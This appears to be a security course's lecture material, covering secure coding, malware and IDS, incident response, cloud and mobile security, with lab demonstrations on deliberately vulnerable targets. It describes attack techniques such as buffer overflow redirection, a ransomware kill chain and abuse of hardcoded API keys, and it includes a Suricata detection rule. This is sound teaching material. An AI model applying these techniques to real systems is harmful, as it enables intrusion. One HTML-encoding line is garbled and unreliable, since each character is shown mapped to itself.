Burp Suite Community Edition configured as browser proxy

review.value: Parameterized queries separate SQL structure from data: cursor.execute('SELECT * FROM users WHERE username = %s AND password = %s', (username, password)). The database driver handles escaping, making SQL injection impossible regardless of what the user types in the input field. There is no valid reason to ever build SQL queries by string concatenation.

When displaying user input in HTML, encode special characters: < becomes <, > becomes >, & becomes &, " becomes ". This ensures the browser renders the characters as text, not as HTML/JavaScript code. Use context-appropriate encoding: HTML encoding for HTML body, JavaScript encoding for JS strings, URL encoding for URLs.

The server generates a random token and includes it in every form as a hidden field. When the form is submitted, the server verifies the token matches. An attacker on a different origin cannot read the token (same-origin policy) and therefore cannot include it in a forged request. SameSite=Strict cookies provide additional protection by not sending cookies with cross-origin requests.

Both are web application security testing proxies. Burp Suite (commercial) has more advanced features and is industry standard for professional pen testing. OWASP ZAP (free, open-source) is excellent for automated scanning and is sufficient for most testing needs. Both intercept, modify, and replay HTTP requests.

learning_objectives: Identify and prevent common software vulnerabilities: buffer overflows, integer overflows, format string bugs, and use-after-free
Apply secure coding practices: input validation, output encoding, error handling, and memory safety
Understand how modern mitigations (ASLR, DEP, stack canaries) protect against exploitation
Perform static and dynamic analysis to find security bugs before deployment
readings: Stallings, Ch. 11 -- Software Security
Seacord, 'Secure Coding in C and C++', Ch. 1-5
OWASP Secure Coding Practices Quick Reference Guide

lecture_notes.introduction: Software vulnerabilities are the root cause of most security breaches. A buffer overflow in a web server, an injection flaw in an API endpoint, or a deserialization vulnerability in a backend service gives attackers the foothold they need to compromise an entire system. Secure coding is the practice of writing software that is resilient to attack by design. This means validating all input (never trust data from external sources), handling errors safely (fail closed, not open), managing memory correctly (buffer overflows remain the most exploited vulnerability class in systems code), and following the principle of least privilege in code (run with minimal permissions, drop privileges as soon as possible). Modern compilers and operating systems provide mitigations against exploitation: Address Space Layout Randomization (ASLR) makes it harder for attackers to predict memory locations, Data Execution Prevention (DEP/NX) prevents executing code on the stack, and stack canaries detect buffer overflows before they can hijack control flow. These mitigations raise the bar for attackers but do not eliminate vulnerabilities -- they must be combined with secure coding practices. Static analysis tools (scanning source code for vulnerability patterns) and dynamic analysis tools (fuzzing with random inputs to find crashes) find bugs that human code review misses.
key_concepts: Buffer overflow: writing data beyond the allocated buffer boundary, overwriting adjacent memory; stack buffer overflows can overwrite the return address, redirecting execution to attacker-controlled code; the most exploited vulnerability class in C/C++ for decades

Stack canary: the compiler places a random value between the local variables and the return address; before returning, the function checks the canary -- if modified by a buffer overflow, the program aborts instead of executing the attacker's code

ASLR (Address Space Layout Randomization): randomizes the base addresses of the stack, heap, libraries, and executable in memory; attackers cannot hardcode addresses in exploits because they change each time the program runs

DEP/NX (Data Execution Prevention / No Execute): marks memory pages as either writable or executable but not both; prevents attackers from executing shellcode placed on the stack or heap; attackers bypass with Return-Oriented Programming (ROP) using existing code gadgets

Input validation: validate all external input at the trust boundary; check type, length, range, format, and allowlist of permitted values; reject invalid input rather than trying to sanitize it (sanitization is error-prone)

Integer overflow: arithmetic on integers exceeding the type's maximum value wraps around; can lead to undersized buffer allocation followed by buffer overflow; example: if (len + header_size > MAX) { error(); } fails if len + header_size wraps to a small number

Format string vulnerability: using user input as a format string in printf-family functions; attacker can read memory (%x), write memory (%n), or crash the program; defense: never use user input as a format string (use printf("%s", user_input) not printf(user_input))

Memory safety: use-after-free (accessing memory after it has been freed, potentially using attacker-controlled data), double-free (freeing the same memory twice, corrupting the heap), null pointer dereference; modern languages (Rust, Go, Java) eliminate these by design; C/C++ requires discipline and tooling (AddressSanitizer, Valgrind)

Static analysis: tools (Semgrep, CodeQL, Coverity) scan source code for vulnerability patterns without executing it; finds SQL injection, XSS, buffer overflows, and other common flaws; integrates into CI/CD for automated security scanning

Dynamic analysis / fuzzing: tools (AFL, libFuzzer) generate random or semi-random inputs to find crashes and hangs; effective at finding buffer overflows, format strings, and assertion failures; OSS-Fuzz has found over 40,000 bugs in open-source projects
lecture_notes.demonstration: Demonstrate a buffer overflow exploitation and mitigation: (1) Write a vulnerable C program with a fixed-size buffer and strcpy from user input. (2) Compile without protections (-fno-stack-protector, -z execstack, ASLR disabled) and demonstrate overwriting the return address to redirect execution. (3) Recompile with stack canary enabled -- the overflow is detected and the program aborts. (4) Enable ASLR and show that the exploit address is wrong. (5) Demonstrate AddressSanitizer catching the overflow at the source. (6) Show the equivalent safe code using strncpy with length checking. (7) Run Semgrep on a Python web application to find SQL injection and XSS vulnerabilities that a developer might miss.
setup_requirements: Vulnerable C programs prepared for the lab
Semgrep or CodeQL installed for static analysis

review.value: Use bounded string functions (strncpy instead of strcpy, snprintf instead of sprintf). Better: use a memory-safe language (Rust, Go, Python, Java) where buffer overflows are impossible by design. For C/C++: enable all compiler protections (stack canary, ASLR, DEP), use AddressSanitizer in testing, and perform code review focused on boundary conditions.

When DEP prevents executing injected code, attackers chain together small sequences of existing code (gadgets) that end in a return instruction. Each gadget performs a small operation (pop a register, set up function arguments). By carefully arranging gadget addresses on the stack, attackers achieve arbitrary code execution without injecting any new code.

Fuzzing is remarkably effective at finding bugs that humans miss. Google's OSS-Fuzz project has found 40,000+ bugs in major open-source projects including OpenSSL, Linux kernel, and SQLite. Coverage-guided fuzzing (AFL) mutates inputs to maximize code coverage, systematically exploring execution paths. Every security-critical project should include fuzzing in CI.

Never expose internal error details to users (stack traces, database errors, file paths). Log detailed errors server-side for debugging but return generic messages to users. Ensure errors fail closed: if the authorization check throws an exception, deny access (do not allow access because the check did not explicitly deny it).

learning_objectives: Classify malware types: viruses, worms, trojans, ransomware, rootkits, and APTs
Perform basic static and dynamic malware analysis in a sandboxed environment
Configure and tune intrusion detection systems (IDS) with Suricata rules
Understand the MITRE ATT&CK framework for mapping adversary techniques to detection opportunities
readings: Stallings, Ch. 6 -- Malicious Software
Sikorski and Honig, 'Practical Malware Analysis', Ch. 1-5
MITRE ATT&CK Framework: Techniques for Enterprise

lecture_notes.introduction: Malware -- malicious software designed to damage, disrupt, or gain unauthorized access to systems -- is the primary tool of cyber attackers. Ransomware encrypts victim files and demands payment for the decryption key, costing organizations billions annually. Advanced Persistent Threats (APTs) are sophisticated, long-term intrusion campaigns by nation-state actors that maintain persistent access to target networks for espionage. Understanding how malware works is essential for building effective defenses. Malware analysis -- examining malicious code to understand its behavior, communication patterns, and capabilities -- informs detection rules, incident response, and attribution. Static analysis examines the malware without executing it (disassembly, string extraction, metadata analysis). Dynamic analysis executes the malware in a controlled sandbox environment and observes its behavior (network connections, file modifications, registry changes). Intrusion detection systems monitor network traffic and host activity for signs of compromise, alerting security teams when malware communicates with command-and-control servers, lateral movement is detected, or data exfiltration begins. The MITRE ATT&CK framework provides a shared vocabulary for mapping adversary techniques to detection opportunities, enabling security teams to systematically assess and improve their detection coverage.
key_concepts: Malware taxonomy: viruses (self-replicating, attach to legitimate files), worms (self-propagating across networks without user interaction), trojans (disguised as legitimate software), ransomware (encrypts files, demands payment), rootkits (hide their presence by modifying the OS), spyware (monitors user activity), botnet (network of compromised machines controlled by attacker)

Ransomware attack chain: initial access (phishing email with malicious attachment) -> execution (macro runs PowerShell downloader) -> persistence (scheduled task or registry key) -> lateral movement (PsExec or WMI across network) -> encryption (AES-256 encrypts files, RSA encrypts AES key) -> ransom note with payment instructions

Static malware analysis: examine the file without executing it; techniques include string extraction (revealing C2 URLs, encryption keys, error messages), import table analysis (which API functions it calls), signature matching (comparing against known malware hashes), and disassembly (understanding the code logic)

Dynamic malware analysis: execute the malware in a sandbox (isolated VM) and observe its behavior; monitor network connections (DNS queries, HTTP requests to C2), file system changes (created/modified/deleted files), registry modifications, and process creation; tools: Cuckoo Sandbox, Any.Run, VirusTotal

Command and control (C2): the communication channel between malware and the attacker; techniques include HTTP/HTTPS beaconing (periodic check-ins disguised as legitimate web traffic), DNS tunneling (encoding data in DNS queries), and domain generation algorithms (DGAs) that generate new domains daily to evade blocking

Intrusion Detection System (IDS): network-based (monitors network traffic) and host-based (monitors system activity); signature-based detection (known attack patterns) vs anomaly-based detection (deviations from baseline); Suricata and Snort use rules matching packet content

Suricata rule syntax: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:'Possible C2 beacon'; content:'User-Agent|3a| Mozilla'; content:'/api/check'; threshold:type both, track by_src, count 10, seconds 60; sid:1000001;) -- alerts on HTTP requests matching specific patterns

MITRE ATT&CK framework: tactics (the adversary's objectives: initial access, execution, persistence, privilege escalation, defense evasion, credential access, discovery, lateral movement, collection, exfiltration, impact) and techniques (how they achieve each tactic); used to assess detection coverage gaps

Indicators of Compromise (IOCs): observable artifacts of malicious activity: file hashes, IP addresses, domain names, URLs, registry keys, mutex names; shared through threat intelligence feeds (STIX/TAXII) for community defense
lecture_notes.demonstration: Analyze a simulated malware sample (custom-built for the course, non-malicious): (1) Static analysis: extract strings revealing a C2 domain, examine imports showing it uses encryption and network APIs. (2) Dynamic analysis in a sandbox VM: run the sample and observe it creating a registry persistence key, beaconing to the C2 domain every 60 seconds, and attempting to scan the local network. (3) Write a Suricata rule to detect the beacon pattern. (4) Map the observed behaviors to MITRE ATT&CK techniques: T1547 (Registry Run Keys for persistence), T1071.001 (HTTP C2 communication), T1046 (Network Service Scanning). (5) Discuss: how would you detect each technique in a production environment?
setup_requirements: Isolated analysis VM (REMnux or FlareVM recommended)

review.value: Prevention: email filtering, application whitelisting, patching, user training. Detection: monitor for mass file encryption (many files modified in rapid succession), known ransomware IOCs, and lateral movement tools (PsExec, WMI). Response: isolated backups (air-gapped, immutable) enable recovery without paying ransom. The 3-2-1 backup rule: 3 copies, 2 different media, 1 offsite.

Sophisticated malware detects sandboxes and behaves differently: checking for VM artifacts (VMware tools, VirtualBox registry keys), limited hardware (low RAM, few CPUs), lack of user activity (no browser history, no recent documents), or time acceleration. Analysis sandboxes must be realistic: real hardware specs, genuine user artifacts, and network simulation.

A default IDS installation generates thousands of alerts per day, mostly false positives. Tuning requires: disabling irrelevant rules (dont alert on services you do not run), adjusting thresholds (beacon detection needs the right frequency), and whitelisting known good traffic. The goal is a manageable number of high-confidence alerts that analysts can investigate.

Map your current detection rules to ATT&CK techniques using the ATT&CK Navigator. Identify gaps: if you have no detection for T1003 (OS Credential Dumping) or T1486 (Data Encrypted for Impact), you are blind to these common techniques. Prioritize building detections for the techniques most commonly used by your threat model's adversaries.

learning_objectives: Follow the NIST incident response lifecycle: preparation, detection, containment, eradication, recovery, lessons learned
Perform basic digital forensics: disk imaging, log analysis, and timeline reconstruction
Write an incident response report with timeline, impact assessment, and remediation recommendations
Understand legal and regulatory requirements for incident notification
readings: NIST SP 800-61: Computer Security Incident Handling Guide
Cichonski et al., 'Guide to Integrating Forensic Techniques into Incident Response'
Stallings, Ch. 18 -- Intrusion Detection and Response

lecture_notes.introduction: No matter how strong your defenses are, incidents will occur. The question is not whether you will be breached, but when -- and how quickly and effectively you respond. A well-prepared incident response reduces breach costs by an average of 50% according to IBM's annual Cost of a Data Breach report. The NIST incident response lifecycle provides a structured framework: preparation (having a plan, tools, and trained team before an incident), detection and analysis (identifying that an incident has occurred and determining its scope), containment (stopping the attack from spreading), eradication (removing the attacker's access and tools), recovery (restoring systems to normal operation), and post-incident activity (learning from the incident to improve defenses). Digital forensics supports incident response by preserving evidence, reconstructing the timeline of attacker actions, determining what data was accessed or exfiltrated, and supporting legal proceedings. Forensic evidence must be collected carefully to maintain chain of custody -- improperly handled evidence may be inadmissible in court. This session covers both the procedural (how to manage an incident) and technical (how to analyze forensic artifacts) aspects of incident response.
key_concepts: NIST IR lifecycle: (1) Preparation -- incident response plan, team roles, communication channels, forensic tools, playbooks for common incidents. (2) Detection and Analysis -- monitoring alerts, triaging potential incidents, determining severity and scope. (3) Containment -- short-term (isolate affected systems, block malicious IPs) and long-term (patch vulnerabilities, reset credentials). (4) Eradication -- remove malware, close backdoors, eliminate root cause. (5) Recovery -- restore from clean backups, monitor for re-infection. (6) Post-Incident -- lessons learned, update playbooks, improve defenses

Incident severity levels: P1/Critical (active data exfiltration, ransomware spreading, production down), P2/High (compromised account with access to sensitive data), P3/Medium (malware contained to one system), P4/Low (phishing email received but not clicked); severity determines response speed and escalation path

Forensic imaging: create a bit-for-bit copy of the affected disk before any analysis; use write blockers to prevent modification of the original evidence; tools: dd (Linux), FTK Imager (Windows); verify the copy by comparing cryptographic hashes of original and image

Log analysis: centralized logging (SIEM -- Security Information and Event Management) aggregates logs from firewalls, servers, applications, and endpoints; timeline reconstruction correlates events across sources to build the attacker's action sequence

Timeline reconstruction: map attacker actions chronologically using log timestamps, file creation/modification times, and network connection records; identify initial access, lateral movement, privilege escalation, data access, and exfiltration

Chain of custody: document every person who handles evidence, when, and what they did; improper chain of custody can invalidate evidence in legal proceedings; use tamper-evident bags, cryptographic hashes, and detailed evidence logs

Indicators of Compromise (IOCs) from incidents: extract file hashes, IP addresses, domain names, and behavioral patterns from the incident; share with the security community through STIX/TAXII threat intelligence sharing; update detection rules to catch similar attacks

Breach notification requirements: GDPR (72 hours to notify supervisory authority), CCPA (expedient notification to affected consumers), HIPAA (60 days to notify affected individuals and HHS), PCI DSS (notify payment card brands immediately); failure to comply results in significant fines

Post-incident improvements: every incident is a learning opportunity; update detection rules, patch the exploited vulnerability, improve access controls, train users if social engineering was involved, update the incident response plan with lessons learned
lecture_notes.demonstration: Respond to a simulated security incident: (1) Alert received: the SIEM detects unusual outbound data transfers from a web server at 2 AM. (2) Triage: examine the alert, correlate with other logs (failed SSH logins followed by a successful login from an unusual IP). (3) Containment: isolate the affected server from the network. (4) Forensics: analyze web server logs showing SQL injection, access logs showing data extraction, and auth logs showing credential reuse. Build a timeline from initial exploitation to data exfiltration. (5) Eradication: identify and patch the SQL injection vulnerability, reset all potentially compromised credentials. (6) Recovery: restore the web server from a known-clean backup, verify the patch, reconnect to the network. (7) Write an incident report with timeline, impact assessment (what data was accessed), and remediation recommendations.
setup_requirements: Pre-built incident scenario with planted log files
SIEM tool or centralized log viewer
Forensic analysis tools (log parser, timeline builder)

review.value: Containment involves trade-offs. Taking a production server offline stops the attack but impacts business operations. Blocking the attacker's IP may cause them to switch to a different access method. Resetting all passwords disrupts all users. The incident commander must weigh security benefit against business impact and make informed decisions quickly.

Collect volatile evidence first (in order of volatility): (1) CPU registers and cache, (2) memory (RAM dump), (3) network connections, (4) running processes, (5) disk, (6) network logs. Memory and network connections are lost when the system is powered off. Disk evidence persists but should be imaged before analysis.

An untested plan fails when needed. Conduct tabletop exercises (walk through a scenario discussing decisions) quarterly, and full simulation exercises (actually execute the plan) annually. Test communication channels, escalation procedures, and forensic tool availability. Update the plan based on exercise findings.

GDPR requires notification to the supervisory authority within 72 hours of becoming aware of a personal data breach. The notification must include: nature of the breach, categories and approximate number of affected individuals, likely consequences, and measures taken to address the breach. Failure to notify can result in fines up to 10 million euros or 2% of global annual revenue.

learning_objectives: Understand the shared responsibility model for cloud security (IaaS, PaaS, SaaS)
Configure cloud security controls: IAM policies, security groups, encryption, and logging
Identify common cloud misconfigurations that lead to data breaches
Apply cloud security best practices using the CIS benchmarks
readings: CSA Cloud Security Alliance, 'Security Guidance for Critical Areas of Cloud Computing v4'
AWS Well-Architected Framework -- Security Pillar
CIS Benchmarks for AWS/Azure/GCP

lecture_notes.introduction: Cloud computing has fundamentally changed the security landscape. Organizations no longer manage their own physical infrastructure, but they remain responsible for securing their data, applications, and configurations within the cloud. The shared responsibility model defines who is responsible for what: the cloud provider secures the infrastructure (physical security, hypervisor, network fabric), while the customer secures everything they put on it (data, applications, IAM configuration, network rules, encryption). Most cloud security incidents are not due to cloud provider failures but to customer misconfigurations: public S3 buckets exposing sensitive data, overly permissive IAM policies granting administrative access to all users, unencrypted databases, and security groups that allow unrestricted inbound access. These misconfigurations are preventable with proper security practices and tooling. Cloud providers offer powerful security services -- identity management (IAM), encryption (KMS), logging (CloudTrail, CloudWatch), and threat detection (GuardDuty) -- but they must be properly configured. This session covers the unique security challenges of cloud environments, common misconfigurations that lead to breaches, and best practices for securing cloud workloads following industry frameworks like CIS Benchmarks and the AWS Well-Architected Framework.
key_concepts: Shared responsibility model: IaaS (customer manages OS, applications, data, network config; provider manages hardware, virtualization, network fabric), PaaS (customer manages applications and data; provider manages runtime, OS, infrastructure), SaaS (customer manages data and access; provider manages everything else)

Identity and Access Management (IAM): define who (identities) can do what (permissions) on which resources; principle of least privilege -- grant only the minimum permissions needed; use IAM roles instead of long-term access keys; enforce MFA for all human users

Cloud IAM best practices: no root account usage (use dedicated admin accounts), group-based permissions (not per-user), service-specific roles (not wildcards like s3:*), regular access reviews (remove unused permissions), and short-lived credentials (assume roles, not static keys)

Security groups and network ACLs: security groups are stateful firewalls at the instance level; NACLs are stateless at the subnet level; default deny all inbound, allow only necessary ports from necessary sources; never allow 0.0.0.0/0 to SSH (port 22) or RDP (port 3389)

Cloud storage security: encrypt at rest (SSE-S3, SSE-KMS, or customer-managed keys), encrypt in transit (HTTPS/TLS), block public access by default (S3 Block Public Access, Azure Storage account settings), versioning and lifecycle policies for data protection

Common cloud misconfigurations: publicly accessible S3 buckets (Capital One breach, 100M records), overly permissive IAM policies (allowing s3:* on all resources), unencrypted RDS instances, security groups allowing 0.0.0.0/0 inbound, CloudTrail logging disabled

Cloud logging and monitoring: enable CloudTrail (AWS), Activity Log (Azure), or Audit Log (GCP) for all API calls; centralize logs in a SIEM; set up alerts for suspicious activity (root account login, large data transfers, new IAM users created at unusual times)

Infrastructure as Code (IaC) security: scan Terraform, CloudFormation, and Kubernetes manifests for misconfigurations before deployment; tools: Checkov, tfsec, Bridgecrew; shift security left by catching misconfigurations in pull requests

Container security: scan container images for vulnerabilities (Trivy, Snyk), use minimal base images (distroless, Alpine), run containers as non-root, use read-only filesystems, implement network policies in Kubernetes
lecture_notes.demonstration: Audit a deliberately misconfigured AWS environment: (1) Use AWS CLI to discover public S3 buckets (aws s3api get-bucket-acl), open security groups (aws ec2 describe-security-groups), and overly permissive IAM policies. (2) Demonstrate how a public S3 bucket exposes data (list and download objects without authentication). (3) Fix each misconfiguration: enable S3 Block Public Access, restrict security groups to specific IPs, apply least-privilege IAM policies. (4) Run Prowler (open-source AWS security audit tool) to automatically scan for CIS Benchmark violations. (5) Set up a CloudWatch alarm for root account usage.
setup_requirements: AWS free-tier account with deliberately misconfigured resources
AWS CLI configured with audit credentials
Prowler or ScoutSuite for automated security scanning

review.value: The Capital One breach (2019) exposed 100 million customer records via a misconfigured WAF that allowed SSRF, which was used to access the EC2 instance metadata service and retrieve IAM role credentials with S3 access. Lesson: defense in depth -- even if the WAF is compromised, the IAM role should have had minimal S3 permissions, and the metadata service should have been restricted (IMDSv2).

Start with zero permissions and add only what is needed (deny by default). Use IAM Access Analyzer to identify unused permissions. Use service control policies (SCPs) in AWS Organizations to set guardrails that no account can exceed. Avoid * permissions and * resources in IAM policies -- always specify the minimum scope.

Cloud is not inherently more or less secure than on-premises. Cloud providers offer better physical security, automated patching, and advanced security services than most organizations can build themselves. But cloud introduces new risks: misconfigurations are easier to make at scale, the attack surface includes APIs that do not exist on-premises, and data residency and compliance become more complex.

Kubernetes adds a new layer of security concerns: pod security policies (restrict privileged containers), network policies (isolate pod communication), RBAC (limit who can deploy and manage workloads), secrets management (use external secret stores, not plaintext in manifests), and image scanning (block vulnerable images from deployment).

learning_objectives: Understand the Android and iOS security models: sandboxing, permissions, and code signing
Identify common mobile vulnerabilities: insecure data storage, insufficient transport security, and client-side injection
Perform basic mobile application security testing using proxy tools and static analysis
Apply OWASP Mobile Top 10 to evaluate mobile application security
readings: OWASP Mobile Top 10 (2024 edition)
OWASP Mobile Security Testing Guide (MSTG), Ch. 1-5
Android Security Architecture Documentation

lecture_notes.introduction: Mobile devices are the primary computing platform for most users, and mobile applications handle sensitive data including banking, healthcare, communications, and authentication. The mobile security landscape presents unique challenges compared to web applications. Mobile apps run on devices the developer does not control, in environments where the OS may be outdated, jailbroken, or compromised. Users install apps from untrusted sources, connect to insecure Wi-Fi networks, and physically lose their devices. The Android and iOS platforms provide robust security foundations -- application sandboxing isolates apps from each other, permission systems control access to sensitive resources, and mandatory code signing ensures app integrity. However, these protections are only as strong as the developer's implementation. Insecure local data storage (storing passwords in plaintext in SharedPreferences), insufficient transport security (not validating TLS certificates), hardcoded secrets (embedding API keys in the app binary), and improper authentication (trusting client-side access control) are common vulnerabilities that undermine the platform's security model. This session covers mobile security architecture, common vulnerabilities, and testing techniques that every developer building mobile applications must understand.
key_concepts: Android security model: each app runs in its own Linux process with its own UID (application sandbox); apps cannot access each other's files; permissions control access to sensitive APIs (camera, location, contacts); apps are signed by the developer (APK signing) for integrity and identity verification

iOS security model: apps run in a sandbox restricting file system access; entitlements control access to system services; App Store review provides a layer of quality and security control; Keychain provides secure credential storage with hardware-backed encryption on devices with Secure Enclave

Insecure data storage: storing sensitive data (credentials, tokens, personal information) in plaintext in SharedPreferences (Android), NSUserDefaults (iOS), SQLite databases, or log files; attackers with physical access or backup access can extract this data

Secure storage solutions: Android Keystore (hardware-backed key storage), iOS Keychain (encrypted credential storage), EncryptedSharedPreferences (Android), and application-level encryption with keys stored in the platform keystore

Transport security: all network communication must use TLS (HTTPS); certificate pinning prevents MITM attacks even when the attacker has a trusted CA certificate; Android Network Security Configuration and iOS App Transport Security (ATS) enforce transport security policies

Certificate pinning: the app verifies that the server's certificate matches a known certificate or public key embedded in the app; prevents interception even if the attacker has a CA-signed certificate for the domain; must handle certificate rotation gracefully

Reverse engineering: mobile apps can be decompiled (jadx for Android APK, Hopper for iOS IPA) to reveal source code, API endpoints, hardcoded secrets, and business logic; obfuscation (ProGuard, R8) makes reverse engineering harder but not impossible; never rely on client-side secrecy

OWASP Mobile Top 10: M1-Improper Credential Usage, M2-Inadequate Supply Chain Security, M3-Insecure Authentication/Authorization, M4-Insufficient Input/Output Validation, M5-Insecure Communication, M6-Inadequate Privacy Controls, M7-Insufficient Binary Protections, M8-Security Misconfiguration, M9-Insecure Data Storage, M10-Insufficient Cryptography

Mobile API security: the backend API is the primary attack surface; the mobile app is just a client -- all security-critical logic (authentication, authorization, input validation) must be enforced server-side; never trust data from the mobile client
lecture_notes.demonstration: Test a deliberately vulnerable Android application: (1) Set up Burp Suite as a proxy on the device and inspect API traffic -- find that credentials are sent over HTTP (not HTTPS). (2) Use jadx to decompile the APK and find a hardcoded API key and an admin endpoint URL. (3) Access the admin endpoint using the discovered API key. (4) Use ADB to examine SharedPreferences and find the user's session token stored in plaintext. (5) Fix each vulnerability: enforce HTTPS with certificate pinning, remove hardcoded secrets (use server-side configuration), restrict the admin endpoint with proper authentication, and migrate to EncryptedSharedPreferences.
setup_requirements: Android emulator or rooted test device
Burp Suite Community Edition configured as mobile proxy
Deliberately vulnerable mobile app (DIVA or InsecureBankv2)

review.value: Anything running on the user's device can be inspected, modified, and bypassed. Client-side checks (input validation, access control, business logic) are for user experience, not security. All security-critical decisions must be enforced on the server. Assume the attacker can modify every request the app sends.

Any secret embedded in a mobile app binary can be extracted by decompiling the app. This includes API keys, encryption keys, and OAuth client secrets. For public clients (mobile apps), use OAuth PKCE (which does not require a client secret) and server-side API key management. Never embed secrets that grant privileged access in client-side code.

Biometric authentication (fingerprint, face) is a local convenience, not a remote security factor. The biometric never leaves the device -- it unlocks a cryptographic key stored in the Secure Enclave / TEE. The server receives a signed challenge response proving the key was unlocked, not the biometric itself. This means biometric bypass attacks are limited to the physical device.
